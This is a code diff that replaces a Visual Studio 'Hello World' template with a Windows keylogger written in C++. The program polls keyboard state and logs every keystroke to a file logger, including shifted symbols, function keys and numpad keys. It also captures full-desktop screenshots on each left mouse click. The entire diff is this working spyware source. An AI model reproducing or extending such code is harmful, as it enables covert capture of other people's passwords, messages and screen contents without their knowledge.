@@ -2,19 +2,155 @@
 //
 
 #include <iostream>
+#include "FileOutput.h"
+#include "gdiplus.h"
+#include "cstring"
+#include <conio.h>
+
+int topLeftX = -1;
+int topLeftY = -1;
+int botRightX = -1;
+int botRightY = -1;
+
+BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor,
+	HDC      hdcMonitor,
+	LPRECT   lprcMonitor,
+	LPARAM   dwData)
+{
+	MONITORINFO info;
+	info.cbSize = sizeof(info);
+	if (GetMonitorInfo(hMonitor, &info))
+	{
+		if (topLeftX == -1 && topLeftY == -1) {
+			topLeftX = info.rcMonitor.left;
+			topLeftY = info.rcMonitor.top;
+			return TRUE;
+		}
+		else {
+			botRightX = info.rcMonitor.right;
+			botRightY = info.rcMonitor.bottom;
+			return TRUE;
+		}
+	}
+	return TRUE;  // continue enumerating
+}
 
 int main()
 {
-    std::cout << "Hello World!\n";
+	FileOutput logger;
+	std::cout << "Keylogger started!\n";
+	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, 0);
+	POINT a{ topLeftX, topLeftY };
+	POINT b{ botRightX, botRightY };
+	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+	ULONG_PTR gdiplusToken;
+	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
+	unsigned char c;
+	for (c = 1; c <= 255; c++) {
+		if ((GetKeyState(VK_LBUTTON) & 0x80) != 0)
+		{
+			logger.screenshot(a, b);
+		}
+		if ((GetKeyState(VK_RBUTTON) & 0x80) != 0)
+		{
+			continue;
+		}
+
+		if (GetAsyncKeyState(c) & 0x0001) {
+
+			std::string s(1, c);
+
+			if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
+			{
+				std::string low(1, tolower(c));
+				logger.log(low);
+			}
+			else if ((c > 64) && (c < 91))
+			{
+				logger.log(s);
+			}
+			else {
+
+				switch (c)
+				{
+				case VK_SPACE: logger.log("<SPACE>"); break;
+				case VK_RETURN: logger.log("<ENTER>"); break;
+				case VK_TAB: logger.log("<TAB>"); break;
+				case VK_BACK: logger.log("<BACKSPACE>"); break;
+				case VK_DELETE: logger.log("<DELETE>"); break;
+				case VK_RSHIFT: logger.log("<RSHIFT>"); break;
+				case VK_SHIFT: logger.log("<SHIFT>"); break;
+				case VK_CAPITAL: logger.log("<CAPS_LOCK>"); break;
+				case VK_CONTROL: logger.log("<CONTROL>"); break;
+
+				case VK_END: logger.log("<END>"); break;
+				case VK_HOME: logger.log("<HOME>"); break;
+				case VK_LEFT:logger.log("<LEFT>"); break;
+				case VK_UP: logger.log("<UP>"); break;
+				case VK_RIGHT: logger.log("<RIGHT>"); break;
+				case VK_DOWN: logger.log("<DOWN>"); break;
+				case VK_PRIOR: logger.log("<PAGE_UP>"); break;
+				case VK_NEXT: logger.log("<PAGE_DOWN>"); break;
+				case VK_INSERT: logger.log("<INSERT>"); break;
+
+				case VK_OEM_PLUS: GetAsyncKeyState(0x10) ? logger.log("+") : logger.log("="); break;
+				case VK_OEM_COMMA: GetAsyncKeyState(0x10) ? logger.log("<") : logger.log(","); break;
+				case VK_OEM_MINUS: GetAsyncKeyState(0x10) ? logger.log("_") : logger.log("-"); break;
+				case VK_OEM_PERIOD: GetAsyncKeyState(0x10) ? logger.log(">") : logger.log("."); break;
+				case VK_OEM_1: GetAsyncKeyState(0x10) ? logger.log(":") : logger.log(";"); break;
+				case VK_OEM_2: GetAsyncKeyState(0x10) ? logger.log("?") : logger.log("/"); break;
+				case VK_OEM_3: GetAsyncKeyState(0x10) ? logger.log("~") : logger.log("`"); break;
+				case VK_OEM_4: GetAsyncKeyState(0x10) ? logger.log("{") : logger.log("["); break;
+				case VK_OEM_5: GetAsyncKeyState(0x10) ? logger.log("|") : logger.log("\\"); break;
+				case VK_OEM_6: GetAsyncKeyState(0x10) ? logger.log("}") : logger.log("]"); break;
+				case VK_OEM_7: GetAsyncKeyState(0x10) ? logger.log("\"") : logger.log("'"); break;
+
+				case VK_F1: logger.log("<F1>"); break;
+				case VK_F2: logger.log("<F2>"); break;
+				case VK_F3: logger.log("<F3>"); break;
+				case VK_F4: logger.log("<F4>"); break;
+				case VK_F5: logger.log("<F5>"); break;
+				case VK_F6: logger.log("<F6>"); break;
+				case VK_F7: logger.log("<F7>"); break;
+				case VK_F8: logger.log("<F8>"); break;
+				case VK_F9: logger.log("<F9>"); break;
+				case VK_F10: logger.log("<F10>"); break;
+				case VK_F11: logger.log("<F11>"); break;
+				case VK_F12: logger.log("<F12>"); break;
+
+				case VK_NUMPAD0: logger.log("<NUM_0>"); break;
+				case VK_NUMPAD1: logger.log("<NUM_1>"); break;
+				case VK_NUMPAD2: logger.log("<NUM_2>"); break;
+				case VK_NUMPAD3: logger.log("<NUM_3>"); break;
+				case VK_NUMPAD4: logger.log("<NUM_4>"); break;
+				case VK_NUMPAD5: logger.log("<NUM_5>"); break;
+				case VK_NUMPAD6: logger.log("<NUM_6>"); break;
+				case VK_NUMPAD7: logger.log("<NUM_7>"); break;
+				case VK_NUMPAD8: logger.log("<NUM_8>"); break;
+				case VK_NUMPAD9: logger.log("<NUM_9>"); break;
+
+
+				case VK_ADD: logger.log("<NUM_ADD>"); break;
+				case VK_DECIMAL: logger.log("<NUM_DECIMAL>"); break;
+				case VK_DIVIDE: logger.log("<NUM_DIVIDE>"); break;
+				case VK_MULTIPLY: logger.log("<NUM_MULTIPLY>"); break;
+				case VK_SUBTRACT: logger.log("<NUM_SUBTRACT>"); break;
+				case VK_SEPARATOR: logger.log("<NUM_SEPARATOR>"); break;
+
+
+				case 48: GetAsyncKeyState(0x10) ? logger.log(")") : logger.log("0"); break;
+				case 49: GetAsyncKeyState(0x10) ? logger.log("!") : logger.log("1"); break;
+				case 50: GetAsyncKeyState(0x10) ? logger.log("@") : logger.log("2"); break;
+				case 51: GetAsyncKeyState(0x10) ? logger.log("#") : logger.log("3"); break;
+				case 52: GetAsyncKeyState(0x10) ? logger.log("$") : logger.log("4"); break;
+				case 53: GetAsyncKeyState(0x10) ? logger.log("%") : logger.log("5"); break;
+				case 54: GetAsyncKeyState(0x10) ? logger.log("^") : logger.log("6"); break;
+				case 55: GetAsyncKeyState(0x10) ? logger.log("&") : logger.log("7"); break;
+				case 56: GetAsyncKeyState(0x10) ? logger.log("*") : logger.log("8"); break;
+				case 57: GetAsyncKeyState(0x10) ? logger.log("(") : logger.log("9"); break;
+				}
+			}
+		}
+	}
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
